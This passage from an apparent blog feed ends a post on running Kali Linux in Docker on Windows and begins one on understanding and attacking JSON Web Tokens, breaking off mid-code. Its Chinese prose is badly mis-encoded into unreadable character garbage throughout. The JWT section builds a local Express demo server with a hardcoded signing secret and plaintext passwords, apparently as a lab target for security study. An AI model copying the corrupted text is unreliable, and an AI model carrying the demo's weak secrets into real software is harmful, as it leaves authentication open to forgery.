ÂèÇÊï∞‰ªÖÂàóÂá∫ÂΩìÂâçËøêË°å‰∏≠ÁöÑÂÆπÂô®„ÄÇ<br><code>docker container rm kali</code> Âà†Èô§ÊåáÂÆöÂÆπÂô®„ÄÇËã•ÂÆπÂô®Ê≠£Âú®ËøêË°åÈúÄÂä†<code>--force</code> ÂèÇÊï∞„ÄÇ</p></li><li><p><code>docker container export -o D:\mykaliv1.tar kali</code> ÂØºÂá∫ÂÆπÂô®Ôºå<strong>Áõ∏ÂΩì‰∫éÊãçÊëÑÂø´ÁÖß</strong> „ÄÇ<br><code>docker import D:\mykaliv1.tar- test/kali:v1</code>  ÂØºÂÖ•ÂÆπÂô®Ôºå<strong>Áõ∏ÂΩì‰∫éËøòÂéüÂø´ÁÖß</strong> „ÄÇ</p></li></ul><h1 id="Êâ©ÂÆπ"><a href="#Êâ©ÂÆπ" class="headerlink" title="Êâ©ÂÆπ"></a>Êâ©ÂÆπ</h1><ul><li>ÂèÇËÄÉÔºö<a href="https://stackoverflow.com/questions/11659005/how-to-resize-a-virtualbox-vmdk-file" target="_blank" rel="noopener">https://stackoverflow.com/questions/11659005/how-to-resize-a-virtualbox-vmdk-file</a> </li></ul><h2 id="Êâ©ÂÆπÁ£ÅÁõò"><a href="#Êâ©ÂÆπÁ£ÅÁõò" class="headerlink" title="Êâ©ÂÆπÁ£ÅÁõò"></a>Êâ©ÂÆπÁ£ÅÁõò</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ÂÖ≥Èó≠ÂÆπÂô®ÂíådefaultËôöÊãüÊú∫</span><br><span class="line">docker stop kali</span><br><span class="line">docker-machine srop</span><br><span class="line">Êâ©ÂÆπÁ£ÅÁõò</span><br><span class="line"><span class="built_in">cd</span> C:\Program Files\Oracle\VirtualBox</span><br><span class="line">VBoxManage clonehd <span class="string">"D:\vmac\dockerMachine\disk.vmdk"</span> <span class="string">"D:\vmac\dockerMachine\cloned.vdi"</span> --format vdi</span><br><span class="line">VBoxManage modifyhd <span class="string">"D:\vmac\dockerMachine\cloned.vdi"</span> --resize 204800</span><br><span class="line">VBoxManage clonehd <span class="string">"D:\vmac\dockerMachine\cloned.vdi"</span> <span class="string">"D:\vmac\dockerMachine\resized.vmdk"</span> --format vmdk</span><br></pre></td></tr></table></figure><h2 id="Ë∞ÉÊï¥ÂàÜÂå∫"><a href="#Ë∞ÉÊï¥ÂàÜÂå∫" class="headerlink" title="Ë∞ÉÊï¥ÂàÜÂå∫"></a>Ë∞ÉÊï¥ÂàÜÂå∫</h2><ul><li>‰ªé <a href="https://gparted.sourceforge.io/download.php" target="_blank" rel="noopener">https://gparted.sourceforge.io/download.php</a> ‰∏ãËΩΩgparted-live-0.31.0-1-amd64.iso„ÄÇ</li><li>Âú®defaultËôöÊãüÊú∫ËÆæÁΩÆÈù¢ÊùøÁöÑ<code>Â≠òÂÇ®-&gt;ÊéßÂà∂Âô®-&gt;Ê∑ªÂä†ËôöÊãüÂÖâÈ©±</code> ‰∏≠Â∞Ügparted-live-0.31.0-1-amd64.iso Âä†Âà∞SATA0Á´ØÂè£Ôºå‰ΩøÂÖ∂ÂºÄÊú∫Á¨¨‰∏Ä‰∏™ÂêØÂä®„ÄÇÁßªÈô§ÂéüÊúâÁ£ÅÁõòÔºåÂ∞ÜÊâ©ÂÆπÂêéÁöÑÁ£ÅÁõòÊîæÂú®ÂéüÊù•Á£ÅÁõòÁöÑ‰ΩçÁΩÆ„ÄÇ</li><li><code>ÂêØÂä®-&gt;Êó†ÁïåÈù¢ÂêØÂä®</code>  Ôºå‰ΩøÁî®GParted Ë∞ÉÊï¥Á£ÅÁõòÁ©∫Èó¥„ÄÇApply„ÄÇÂèåÂáªÊ°åÈù¢<code>EXIT</code> ÔºåÈÄâÊã©shutdownÈÄÄÂá∫ÔºåÊåâÂè≥CTRLÈîÆ‰ΩøÁÑ¶ÁÇπÂõûÂà∞‰∏ªÊú∫<br><img src="1526135602464.png" alt="1526135602464"></li><li>ÊÅ¢Â§çËôöÊãüÊú∫Â≠òÂÇ®ËÆæÁΩÆËá≥‰∏ãÂÖ•Áä∂ÊÄÅ<br><img src="1526142367100.png" alt="1526142367100"></li></ul><h2 id="Êü•ÁúãË∞ÉÊï¥ÂàÜÂå∫ÊòØÂê¶ÊàêÂäü"><a href="#Êü•ÁúãË∞ÉÊï¥ÂàÜÂå∫ÊòØÂê¶ÊàêÂäü" class="headerlink" title="Êü•ÁúãË∞ÉÊï¥ÂàÜÂå∫ÊòØÂê¶ÊàêÂäü"></a>Êü•ÁúãË∞ÉÊï¥ÂàÜÂå∫ÊòØÂê¶ÊàêÂäü</h2><ul><li><p><code>docker-machine start default</code> </p></li><li><p><code>docker-machine ssh default</code> ËøõÂÖ•defaultËôöÊãüÊú∫ÁöÑshellÔºåÂéªÁúãÁúãÂàÜÂå∫Êâ©ÂÆπÊòØÂê¶ÊàêÂäü</p></li><li><p>Êü•ÁúãÂπ∂ËÆ∞ÂΩïÂΩìÂâçÁä∂ÊÄÅ</p><ul><li><code>fdisk -l</code></li><li><code>df -h</code></li><li><code>cat /etc/fstab</code>   (/boot/grub/menu.lstÊñá‰ª∂Ê≤°ÊâæÂà∞)</li></ul></li><li><p>ÂØπÊØîÂâçÂêéÁä∂ÊÄÅÂèØ‰ª•ÁúãÂà∞Â∑≤ÁªèÊàêÂäü‰∫Ü<br><img src="1526100195018.png" alt="1526100195018"><br><img src="1526137337445.png" alt="1526137337445"></p></li></ul><h2 id="Partition-table-entries-are-not-in-disk-order"><a href="#Partition-table-entries-are-not-in-disk-order" class="headerlink" title="Partition table entries are not in disk order"></a>Partition table entries are not in disk order</h2><p><code>fdisk -l</code> Âá∫Áé∞<code>Partition table entries are not in disk order</code> ÈóÆÈ¢ò„ÄÇÂ≠óÈù¢‰∏äÁúãÊòØÂàÜÂå∫Ë°®ÂíåÁ°¨ÁõòÂàÜÂå∫‰∏ç‰∏ÄËá¥„ÄÇÊü•ËµÑÊñôÊçÆËØ¥‰∏çÂΩ±ÂìçÔºå‰∏çËøáËøòÊòØËØïÁùÄËß£ÂÜ≥‰∏ã„ÄÇ</p><ul><li>ÂèÇËÄÉÈìæÊé•<ul><li><a href="https://ubuntuforums.org/showthread.php?t=1252662" target="_blank" rel="noopener">https://ubuntuforums.org/showthread.php?t=1252662</a></li><li><a href="https://blog.csdn.net/wujiangguizhen/article/details/22857667" target="_blank" rel="noopener">https://blog.csdn.net/wujiangguizhen/article/details/22857667</a></li></ul></li><li>Êìç‰ΩúÊ≠•È™§<ul><li><code>docker-machine ssh default</code></li><li><code>sudo -i</code> ÂàáÊç¢Âà∞rootÊùÉÈôê  (<a href="https://stackoverflow.com/questions/32646952/docker-machine-boot2docker-root-password" target="_blank" rel="noopener">https://stackoverflow.com/questions/32646952/docker-machine-boot2docker-root-password</a>)</li><li><code>fdisk /dev/sda</code><ul><li><code>x</code> ËøõÂÖ•‰∏ìÂÆ∂Ê®°Âºè</li><li><code>f</code> fix partition order</li><li><code>w</code> ÂÜôÂÖ•ÂèòÂåñ</li></ul></li><li><img src="1526137422738.png" alt="1526137422738"></li><li>Ëß£ÂÜ≥ÂêéÂàÜÂå∫Áä∂ÊÄÅÂ¶Ç‰∏ã„ÄÇÂØπÊØî‰∏äÂõæÂèØ‰ª•ÂèëÁé∞sda1Âíåsda2‰∫íÊç¢‰∫Ü„ÄÇ<br><img src="1526142973113.png" alt="1526142973113"></li></ul></li></ul><h1 id="ÂõæÂΩ¢ÁïåÈù¢"><a href="#ÂõæÂΩ¢ÁïåÈù¢" class="headerlink" title="ÂõæÂΩ¢ÁïåÈù¢"></a>ÂõæÂΩ¢ÁïåÈù¢</h1><p>ÂèÇËÄÉÈìæÊé•Ôºö</p><ul><li><a href="https://mp.weixin.qq.com/s?__biz=MzI4MzAwNTQ3NQ==&amp;mid=209866190&amp;idx=1&amp;sn=0ee75509eb2fab454009125e0a8c6437" target="_blank" rel="noopener">„ÄêÂæÆ‰ø°ÂàÜ‰∫´„ÄëÊûóÂ∏ÜÔºöDockerËøêË°åGUIËΩØ‰ª∂ÁöÑÊñπÊ≥ï</a> </li><li><a href="http://www.cnblogs.com/starspace/archive/2009/02/13/1390062.html" target="_blank" rel="noopener">shell‰∏≠Ëé∑ÂèñÊú¨Êú∫ipÂú∞ÂùÄ</a> </li><li><a href="https://superuser.com/questions/325630/how-can-i-export-display-from-a-linux-terminal-to-a-windows-pc" target="_blank" rel="noopener">How can I export DISPLAY from a Linux terminal to a Windows PC?</a> </li><li><a href="https://blog.csdn.net/dream_broken/article/details/52414560" target="_blank" rel="noopener">dockerÂ≠¶‰π†8‚ÄìÂêå‰∏ªÊú∫‰∏ãÂÆπÂô®ÈÄö‰ø°</a> </li><li><a href="https://askubuntu.com/questions/432255/what-is-the-display-environment-variable" target="_blank" rel="noopener">What is the $DISPLAY environment variable?</a> </li><li><a href="https://stackoverflow.com/questions/24095968/docker-for-gui-based-environments" target="_blank" rel="noopener">Docker for GUI-based environments?</a> </li><li><a href="https://stackoverflow.com/questions/16296753/can-you-run-gui-apps-in-a-docker-container" target="_blank" rel="noopener">Can you run GUI apps in a docker container?</a></li></ul><p>Â§ßËá¥ÁêÜËß£DockerÁΩëÁªúÁªìÊûÑÂíåXXËΩ¨ÂèëÊµÅÁ®ã</p><p><img src="1526182398234.png" alt="1526182398234"></p><p>ÂêØÂä®‰∏Ä‰∏™Êñ∞ÈÖçÂà∂ÂèÇÊï∞ÁöÑÂÆπÂô®ÔºåÂ∞Ü‰∏ªÊú∫‰∏äX11ÁöÑunixÂ•óÊé•Â≠óÂÖ±‰∫´Âà∞kaliÂÆπÂô®ÈáåÈù¢ </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it  -v /etc/localtime:/etc/localtime:ro -v /tmp/.X11-unix:/tmp/.X11-unix  -e DISPLAY=<span class="string">"192.168.233.101:0.0"</span>  -e GDK_SCALE  -e GDK_DPI_SCALE --name gkali findneo/kali:v1 bash</span><br></pre></td></tr></table></figure><p>Âú®<code>Setting-&gt;Configuration</code> ÈáåÂèñÊ∂àMobaXtermÁöÑX serverÁöÑËÆøÈóÆÊéßÂà∂„ÄÇ</p><p><img src="1526182806764.png" alt="1526182806764"></p><p>ÂêØÂä®ÂÆπÂô®Âç≥ÂèØ‰ΩøÁî®GUI„ÄÇÂèØ‰ª•‰ΩøÁî®<code>xcal,xclock,xedit,xmessage,xeyes,xmessage</code> Á≠âÁ≠âÂ∞èÁ®ãÂ∫èÊµãËØïX11ËΩ¨ÂèëÊòØÂê¶Ê≠£Â∏∏Â∑•‰ΩúÔºà<code>ls /usr/bin/x*</code> ÂèØ‰ª•ÁúãÂà∞Êõ¥Â§öÔºâ</p><p><img src="1526182630443.png" alt="1526182630443"></p><h2 id="SSH-ËøûÂÖ•"><a href="#SSH-ËøûÂÖ•" class="headerlink" title="SSH ËøûÂÖ•"></a>SSH ËøûÂÖ•</h2><p>‰ªéÂÆπÂô®ËÆøÈóÆ‰∏ªÊú∫ÂèØ‰ª•Áõ¥Êé•‰ΩøÁî®‰∏ªÊú∫ÁöÑIPÂú∞ÂùÄÔºà<code>ipconfig</code>ÔºâÔºå‰ªé‰∏ªÊú∫ËÆøÈóÆÂÆπÂô®ÂÆûÈôÖ‰∏äÊòØËÆøÈóÆ<code>boot2docker</code> ËôöÊãüÊú∫ÁöÑIP Ôºà<code>docker-machine.exe ssh default &quot;/sbin/ifconfig eth1|sed -n &#39;/inet addr/s/^[^:]*:\([0-9.]\{7,15\}\) .*/\1/p&#39;&quot;</code>ÔºâÂíåÂêØÂä®ÂÆπÂô®Êó∂ÈÖçÁΩÆÁöÑËΩ¨ÂèëÁ´ØÂè£ Ôºà<code>docker run -p 12345:22 ...</code> Ôºâ„ÄÇ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ÊâÄ‰ª•ÁêÜËÆ∫‰∏äËøôÊ†∑ÂêØÂä®‰∏Ä‰∏™ÂÆπÂô®Êó¢ÂèØ‰ª•SSHËøûÂÖ•ÔºåÂèàÂèØ‰ª•‰ΩøÁî®ÂõæÂΩ¢ÁïåÈù¢„ÄÇ</span><br><span class="line">docker run -it  -v /etc/localtime:/etc/localtime:ro -v /tmp/.X11-unix:/tmp/.X11-unix  -e DISPLAY=<span class="string">"192.168.233.101:0.0"</span>  -e GDK_SCALE  -e GDK_DPI_SCALE -p 52023:22 --name kali findneo/kali:v2</span><br></pre></td></tr></table></figure><h1 id="ÂèÇËÄÉÈìæÊé•"><a href="#ÂèÇËÄÉÈìæÊé•" class="headerlink" title="ÂèÇËÄÉÈìæÊé•"></a>ÂèÇËÄÉÈìæÊé•</h1><ul><li><a href="https://yeasy.gitbooks.io/docker_practice/content/" target="_blank" rel="noopener">https://yeasy.gitbooks.io/docker_practice/content/</a>  </li><li><a href="https://blogs.technet.microsoft.com/positivesecurity/2017/09/01/setting-up-kali-linux-in-docker-on-windows-10/" target="_blank" rel="noopener">https://blogs.technet.microsoft.com/positivesecurity/2017/09/01/setting-up-kali-linux-in-docker-on-windows-10/</a>   </li><li><a href="https://stackoverflow.com/questions/32646952/docker-machine-boot2docker-root-password" target="_blank" rel="noopener">https://stackoverflow.com/questions/32646952/docker-machine-boot2docker-root-password</a> </li><li><a href="https://ubuntuforums.org/showthread.php?t=1252662" target="_blank" rel="noopener">https://ubuntuforums.org/showthread.php?t=1252662</a><ul><li><a href="https://blog.csdn.net/wujiangguizhen/article/details/22857667" target="_blank" rel="noopener">https://blog.csdn.net/wujiangguizhen/article/details/22857667</a> </li><li><a href="https://stackoverflow.com/questions/11659005/how-to-resize-a-virtualbox-vmdk-file" target="_blank" rel="noopener">https://stackoverflow.com/questions/11659005/how-to-resize-a-virtualbox-vmdk-file</a> </li></ul></li></ul><blockquote><p>ÂÆπÂô®‰∏çÂ∫îËØ•ÊòØÈïø‰πÖÊÄßÁöÑ‰∏úË•øÔºåË¶Å‰øùÊåÅÂÆπÂô®ÁöÑÂèØÊäõÂºÉÊÄßÔºåÊúâÈóÆÈ¢òÂ∞±Â∫îËØ•rmÊéâÔºåÊï∞ÊçÆ‰øùÂ≠òÂú®ÂÆπÂô®Â§ñÔºåÁÑ∂ÂêéÁõ¥Êé•runÊñ∞ÁöÑÂÆπÂô®„ÄÇ ‚Äî‚Äî<a href="http://www.talkwithtrend.com/Question/233635" target="_blank" rel="noopener">http://www.talkwithtrend.com/Question/233635</a> </p></blockquote><p>ÁúãÂà∞‰∏äÈù¢Ëøô‰∏™ÔºåÊÑüËßâËá™Â∑±ÁöÑÁî®Ê≥ïÂèØËÉΩÊúâÁÇπÂ•áÊÄ™ÔºöÔºâ</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;ÂÖ®Á®ãÈúÄ‰øùËØÅ‰øùËØÅÁΩëÁªúÁïÖÈÄö&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&quot;ÂÆâË£ÖDocker&quot;&gt;&lt;a href=&quot;#ÂÆâË£ÖDocker&quot; class=&quot;headerlink&quot; title=&quot;ÂÆâË£ÖDocker&quot;&gt;&lt;/a&gt;ÂÆâË£ÖDocker&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;‰ªé
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>JSON Web TokenÁöÑËÆ§ËØÜ‰∏éÊîªÂáª</title>
    <link href="https://findneo.github.io/180503jwt/"/>
    <id>https://findneo.github.io/180503jwt/</id>
    <published>2018-05-03T14:22:34.000Z</published>
    <updated>2019-01-25T23:21:37.003Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Êú¨ÊñáÈ¶ñÂèë  <a href="http://www.freebuf.com/column/170359.html" target="_blank" rel="noopener">Freebuf</a>   „ÄÇÁï•ÊúâÊõ¥Êñ∞„ÄÇ</strong>  </p><h1 id="0x01-ÂàùËØÜJWT"><a href="#0x01-ÂàùËØÜJWT" class="headerlink" title="0x01 ÂàùËØÜJWT"></a>0x01 ÂàùËØÜJWT</h1><p>JWT Ôºà <code>JSON Web Token</code> ÁöÑÁº©ÂÜôÔºâÊòØ‰∏Ä‰∏≤Â∏¶ÊúâÂ£∞Êòé‰ø°ÊÅØÁöÑÂ≠óÁ¨¶‰∏≤ÔºåÁî±ÊúçÂä°Á´ØÁî®Âä†ÂØÜÁÆóÊ≥ïÂØπ‰ø°ÊÅØÁ≠æÂêçÊù•‰øùËØÅÂÖ∂ÂÆåÊï¥ÊÄßÂíå‰∏çÂèØ‰º™ÈÄ†„ÄÇTokenÈáåÂèØ‰ª•ÂåÖÂê´ÊâÄÊúâÂøÖË¶Å‰ø°ÊÅØÔºåËøôÊ†∑ÊúçÂä°Á´ØÂ∞±Êó†ÈúÄ‰øùÂ≠ò‰ªª‰ΩïÂÖ≥‰∫éÁî®Êà∑Êàñ‰ºöËØùÁöÑ‰ø°ÊÅØÔºåJWTÂèØÁî®‰∫éË∫´‰ªΩËÆ§ËØÅ„ÄÅ‰ºöËØùÁä∂ÊÄÅÁª¥ÊåÅ„ÄÅ‰ø°ÊÅØ‰∫§Êç¢Á≠â„ÄÇ</p><p>JWT Áî±‰∏âÈÉ®ÂàÜÊûÑÊàêÔºåÂàÜÂà´Áß∞‰∏∫ <code>header</code> „ÄÅ<code>payload</code> Âíå <code>signature</code> ÔºåÂêÑÈÉ®ÂàÜÁî®<code>.</code> Áõ∏ËøûÊûÑÊàê‰∏Ä‰∏™ÂÆåÊï¥ÁöÑTokenÔºåÂΩ¢Â¶Ç<code>xxxxx.yyyyy.zzzzz</code> „ÄÇ</p><p>ÂàÜÂà´Áúã‰∏ãÂêÑ‰∏™ÈÉ®ÂàÜÔºö</p><p><strong>header</strong> Ôºö</p><p>‰ΩøÁî®‰∏Ä‰∏™JSONÊ†ºÂºèÂ≠óÁ¨¶‰∏≤Â£∞ÊòétokenÁöÑÁ±ªÂûãÂíåÁ≠æÂêçÁî®ÁöÑÁÆóÊ≥ïÁ≠âÔºåÂΩ¢Â¶Ç<code>{&quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;}</code> „ÄÇËØ•Â≠óÁ¨¶‰∏≤ÁªèËøáBase64UrlÁºñÁ†ÅÂêéÂΩ¢ÊàêJWTÁöÑÁ¨¨‰∏ÄÈÉ®ÂàÜ<code>xxxxx</code>„ÄÇ</p><p>Base64UrlÁºñÁ†ÅÂèØ‰ª•Áî®ËøôÊÆµ‰ª£Á†ÅÁõ¥ËßÇÁêÜËß£Ôºö</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base64URLen</span><span class="params">(s)</span>:</span></span><br><span class="line">t0=b64encode(s)</span><br><span class="line">t1=t0.strip(<span class="string">'='</span>).replace(<span class="string">'+'</span>,<span class="string">'-'</span>).replace(<span class="string">'/'</span>,<span class="string">'_'</span>)</span><br><span class="line"><span class="keyword">return</span> t1</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base64URLde</span><span class="params">(s)</span>:</span></span><br><span class="line">t0=s.replace(<span class="string">'-'</span>,<span class="string">'+'</span>).replace(<span class="string">'_'</span>,<span class="string">'/'</span>)</span><br><span class="line">t1=t0+<span class="string">'='</span>*(<span class="number">4</span>-len(t0)%<span class="number">4</span>)%<span class="number">4</span></span><br><span class="line"><span class="keyword">return</span> b64decode(t1)</span><br></pre></td></tr></table></figure><p><strong>payload</strong> :</p><p>‰ΩøÁî®‰∏Ä‰∏™JSONÊ†ºÂºèÂ≠óÁ¨¶‰∏≤ÊèèËø∞ÊâÄË¶ÅÂ£∞ÊòéÁöÑ‰ø°ÊÅØÔºåÂàÜ‰∏∫ <code>registered</code> „ÄÅ<code>public</code> „ÄÅ Âíå <code>private</code> ‰∏âÁ±ªÔºåÂΩ¢Â¶Ç<code>{&quot;name&quot;: &quot;John Doe&quot;, &quot;admin&quot;: true}</code> ÔºåÂÖ∑‰Ωì‰ø°ÊÅØÂèØÂèÇËÄÉ <a href="https://tools.ietf.org/html/rfc7519#section-4" target="_blank" rel="noopener">RFC7519 ÁöÑ JWT claims</a> ÈÉ®ÂàÜ„ÄÇ</p><p>ÂêåÊ†∑ÁöÑÔºåËØ•Â≠óÁ¨¶‰∏≤ÁªèËøáBase64UrlÁºñÁ†ÅÂΩ¢ÊàêJWTÁöÑÁ¨¨‰∫åÈÉ®ÂàÜ<code>yyyyy</code>„ÄÇ</p><p><strong>signature</strong> :</p><p>Â∞Ü <code>xxxxx.yyyyy</code> ‰ΩøÁî®<code>alg</code> ÊåáÂÆöÁöÑÁÆóÊ≥ïÂä†ÂØÜÔºåÁÑ∂ÂêéÂÜçBase64UrlÁºñÁ†ÅÂæóÂà∞JWTÁöÑÁ¨¨‰∏âÈÉ®ÂàÜ<code>zzzzz</code> „ÄÇÊâÄÊîØÊåÅÁöÑÁÆóÊ≥ï Á±ªÂûãÂèñÂÜ≥‰∫éÂÆûÁé∞Ôºå‰ΩÜ<code>HS256</code> Âíå <code>none</code> ÊòØÂº∫Âà∂Ë¶ÅÊ±ÇÂÆûÁé∞ÁöÑ„ÄÇ</p><h1 id="0x02-ÁÆÄÂçïÂ∫îÁî®"><a href="#0x02-ÁÆÄÂçïÂ∫îÁî®" class="headerlink" title="0x02 ÁÆÄÂçïÂ∫îÁî®"></a>0x02 ÁÆÄÂçïÂ∫îÁî®</h1><p>Âú®Êú¨Âú∞ËøêË°åËµ∑ÁÆÄÂçïÁöÑÂü∫‰∫éExpressÁöÑÂèØÂèëÊîæÂíåÂ§ÑÁêÜJWTÁöÑÊúçÂä°„ÄÇ</p><ol><li><strong>ÂÆâË£ÖNode.js„ÄÇ</strong>Node.jsÊòØJavaScriptËøêË°åÊó∂ÁéØÂ¢ÉÔºåÈááÁî®ËΩªÈáèÈ´òÊïàÁöÑ‰∫ã‰ª∂È©±Âä®„ÄÅÊó†ÈòªÂ°ûI/OÊ®°ÂûãÔºåÊã•ÊúâÊúÄÂ§ßÁöÑÂºÄÊ∫êÂ∫ìÁîüÊÄÅnmp„ÄÇ</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WindowsÂπ≥Âè∞ÂèØÂú® https:<span class="comment">//nodejs.org/en/download/ ‰∏ãËΩΩÂÆâË£ÖÂåÖ </span></span><br><span class="line">*nix Âπ≥Âè∞ÂèØÊ†πÊçÆ https:<span class="comment">//nodejs.org/en/download/package-manager/ ÊèêÁ§∫‰ΩøÁî®ÂåÖÁÆ°ÁêÜÂô®ÂÆâË£Ö</span></span><br></pre></td></tr></table></figure><ol><li><strong>ÂÆâË£ÖExpress</strong>Ôºå‰∏ÄÊ¨æÂü∫‰∫éNode.jsÁöÑÂø´ÈÄü„ÄÅÁÅµÊ¥ª„ÄÅÊûÅÁÆÄÁöÑWebÊ°ÜÊû∂„ÄÇ</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> http://expressjs.com/en/starter/installing.html</span></span><br><span class="line">mkdir D:\myapp &amp;&amp; cd D:\myapp </span><br><span class="line">ÔºàÂÖ®ÈÉ®ÂõûËΩ¶Ôºå‰øùÊåÅÈªòËÆ§ÈÖçÁΩÆÔºâ</span><br><span class="line">npm init </span><br><span class="line">npm install express --save</span><br></pre></td></tr></table></figure><ol><li><strong>ËøêË°åÊú¨Âú∞ÊúçÂä°</strong></li></ol><p>Êñ∞Âª∫ <code>index.js</code> ÔºåÂÜÖÂÆπÂ¶Ç‰∏ã</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line">app.get(<span class="string">'/'</span>, (req, res) =&gt; res.send(<span class="string">'Hello World!'</span>))</span><br><span class="line">app.listen(<span class="number">3000</span>, () =&gt; <span class="built_in">console</span>.log(<span class="string">'Example app listening on port 3000!'</span>))</span><br></pre></td></tr></table></figure><p>ËøêË°å<code>node index.js</code> ÔºåÂ∞±ÂèØ‰ªéÊú¨Âú∞ËÆøÈóÆ <code>http://localhost:3000</code> „ÄÇ</p><ol><li><strong>ÂÆâË£ÖÂøÖË¶ÅÊ®°ÂùóÔºö</strong> ÈÄÇÁî®‰∫éNode.jsÁöÑJWTÁºñËß£Á†ÅÊ®°Âùó <code>node-jwt-simple</code> Âíå cookieËß£ÊûêÊ®°Âùó <code>cookie-parser</code> </li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> https://github.com/hokaccha/node-jwt-simple</span></span><br><span class="line">npm install jwt-simple</span><br><span class="line">npm install cookie-parser</span><br></pre></td></tr></table></figure><ol><li><strong>‰∏Ä‰∏™ÁÆÄÂçïÁöÑÊú¨Âú∞demo</strong> </li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.js</span></span><br><span class="line"><span class="comment">//http://expressjs.com/en/4x/api.html</span></span><br><span class="line"><span class="comment">//https://github.com/hokaccha/node-jwt-simple</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//‰∏Ä‰∫õÂàùÂßãÂåñÁöÑÂ∑•‰Ωú</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">var</span> jwt = <span class="built_in">require</span>(<span class="string">'jwt-simple'</span>)</span><br><span class="line"><span class="keyword">var</span> cookieParser = <span class="built_in">require</span>(<span class="string">'cookie-parser'</span>)</span><br><span class="line"><span class="keyword">var</span> jwt_secret = <span class="string">"this is a secret for jwt"</span></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line">app.use(cookieParser())</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>,(req,res)=&gt;res.redirect(<span class="string">'/help'</span>))</span><br><span class="line">app.get(<span class="string">'/help'</span>, (req, res) =&gt; &#123;</span><br><span class="line"><span class="keyword">var</span> RequstedURL=req.protocol+<span class="string">'://'</span>+req.get(<span class="string">'Host'</span>)</span><br><span class="line">res.send([ </span><br><span class="line"><span class="string">'GET '</span>+RequstedURL+<span class="string">'/login?user=name&amp;pass=passwd to get your JSON Web Token '</span> , </span><br><span class="line"><span class="string">'GET '</span>+RequstedURL+<span class="string">'/whoami to identify yourself'</span></span><br><span class="line">].join(<span class="string">'&lt;br&gt;'</span>))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/login'</span>,(req,res)=&gt;&#123;</span><br><span class="line"><span class="keyword">var</span> users=&#123;</span><br><span class="line"><span class="string">"admin"</span>:<span class="string">"admin_password_is_hard_to_guess"</span>,</span><br><span class="line"><span class="string">"test"</span>:<span class="string">"test123"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> payload = &#123;<span class="string">"name"</span>:req.query.user&#125;</span><br><span class="line"><span class="keyword">if</span>(users[req.query.user]===req.query.pass)&#123;</span><br><span class="line">res.cookie(<span class="string">'jwt'</span>,jwt.encode(payload,jwt_secret))</span><br><span class="line">res.send(req.query.user +<span class="string">' logged in'</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;res.send(<span class="string">'login failed!'</span>)&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/whoami'</span>,(req,res)=&gt;&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;res.send(<span class="string">"you are logged in as :&lt;br&gt;"</span> +jwt.decode(req.cookies.jwt,jwt_secret)[<span class="string">'name'</span>])&#125;</span><br><span 